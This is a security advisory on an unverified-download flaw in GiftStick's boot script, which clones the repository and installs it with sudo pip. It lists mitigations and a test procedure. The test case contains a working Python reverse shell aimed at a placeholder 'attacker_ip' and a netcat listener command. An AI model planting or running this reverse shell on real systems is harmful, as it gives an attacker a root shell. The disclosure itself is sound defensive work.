### Vulnerability List

- Vulnerability Name: Unverified Download of GiftStick Code
- Description:
  - Step 1: The `call_auto_forensicate.sh` script, executed on the target system after booting from the GiftStick USB, initiates a `git clone` command to download the GiftStick source code from `https://github.com/google/GiftStick`.
  - Step 2: This download occurs over HTTPS, which encrypts the communication channel, but the script does not perform any verification of the downloaded code's integrity or authenticity after the cloning process.
  - Step 3: An attacker capable of performing a Man-In-The-Middle (MITM) attack or compromising the GitHub repository `github.com/google/GiftStick` could inject malicious code into the repository.
  - Step 4: Subsequently, the script navigates into the cloned `GiftStick` directory (`cd GiftStick`).
  - Step 5: The script then executes `sudo pip install .`, which installs the Python package from the current directory (the cloned repository). This command runs with root privileges due to `sudo`.
  - Step 6: If malicious code was injected into the cloned repository, `pip install .` will install and execute it with root privileges, leading to system compromise.

- Impact:
  - Critical. Successful exploitation of this vulnerability allows for arbitrary command execution with root privileges on the target system.
  - An attacker can gain full control over the compromised system, enabling them to:
    - Install persistent backdoors for future access.
    - Steal sensitive data from the target system.
    - Modify or delete critical system files.
    - Use the compromised system as a launchpad for further attacks within the network.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
  - None. The project currently lacks any mechanisms to verify the integrity or authenticity of the downloaded GiftStick code within the `call_auto_forensicate.sh` script.

- Missing Mitigations:
  - Implement code verification to ensure the integrity and authenticity of the downloaded GiftStick code before installation. Recommended mitigations include:
    - Verifying Git Commit Hash: Modify `call_auto_forensicate.sh` to clone a specific commit hash of the GiftStick repository and verify this hash against a known, trusted value.
    - Verifying GPG Signature: Implement GPG signature verification for release tags or commits. This involves downloading the GPG signature and public key, and then using `gpg --verify` to validate the signature.
    - Using Release Archives with Checksums/Signatures: Instead of cloning the Git repository, download a pre-packaged release archive (e.g., tar.gz or zip) from the GitHub releases page. Verify the downloaded archive using a detached signature file or a cryptographic checksum (like SHA256) against a known good value published on the official GiftStick website or repository.

- Preconditions:
  - Precondition 1: An attacker must be in a position to execute a Man-In-The-Middle (MITM) attack during the `git clone` operation, or successfully compromise the GitHub repository `github.com/google/GiftStick`.
  - Precondition 2: A target user must create a GiftStick USB drive and boot a target system using this drive.
  - Precondition 3: The target system, after booting from the malicious GiftStick USB, must have an active internet connection to perform the `git clone` operation.

- Source Code Analysis:
  - File: `/code/tools/remaster_scripts/call_auto_forensicate.sh`
  - Step-by-step analysis:
    1. `git clone https://github.com/google/GiftStick`: This command clones the GiftStick repository from GitHub. The script relies on HTTPS for transport security but does not verify the content's integrity.
    2. `cd GiftStick`: Navigates into the cloned directory.
    3. `sudo pip install .`: Installs the GiftStick package from the current directory. This command executes `setup.py` and any other installation scripts within the cloned repository with root privileges.
  - Visualization:
    ```
    Target System (GiftStick Booted) --> Internet (github.com/google/GiftStick) --> Attacker (MITM or Repo Compromise) --> Malicious GiftStick Code --> Target System (Root Compromise via `sudo pip install .`)
    ```

- Security Test Case:
  - Step 1: Set up a controlled network environment where you can simulate a MITM attack or, for testing purposes, directly host a malicious Git repository mimicking `github.com/google/GiftStick`.
  - Step 2: Create a malicious GiftStick repository. In this repository, modify the `auto_forensicate/auto_acquire.py` file to include malicious code. For example, add a simple reverse shell that connects back to an attacker-controlled machine:
    ```python
    # In auto_forensicate/auto_acquire.py
    import os
    import socket
    import subprocess

    # Malicious code: Reverse shell
    def reverse_shell():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("attacker_ip", 4444)) # Replace attacker_ip
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            subprocess.call(["/bin/sh", "-i"])
        except Exception as e:
            pass # Handle exceptions silently in boot scripts

    reverse_shell()

    # ... rest of the original auto_acquire.py code ...
    ```
    **Note**: Replace `"attacker_ip"` with the IP address of your attacker-controlled machine that will listen for the reverse shell connection.
  - Step 3: Configure your network to redirect requests for `github.com` to your malicious server (if simulating MITM) or directly host the malicious repository on a server accessible to the test system.
  - Step 4: Create a GiftStick USB drive using the standard `remaster.sh` script and a clean Xubuntu 20.04 ISO.
  - Step 5: Boot a test system from the created GiftStick USB drive. Ensure this test system is connected to the network where your malicious server is set up and can resolve the (faked or real, depending on test setup) `github.com`.
  - Step 6: On your attacker-controlled machine, set up a netcat listener to receive the reverse shell connection: `nc -lvnp 4444`.
  - Step 7: Observe the boot process of the test system. The `call_auto_forensicate.sh` script should execute, clone the malicious GiftStick repository, and install it.
  - Step 8: Check your netcat listener. You should receive a reverse shell connection from the compromised test system, indicating successful arbitrary code execution with root privileges.

This security test case confirms the vulnerability by demonstrating that a malicious GiftStick can be created to execute arbitrary commands with root privileges on a target system due to the lack of verification of the downloaded code.
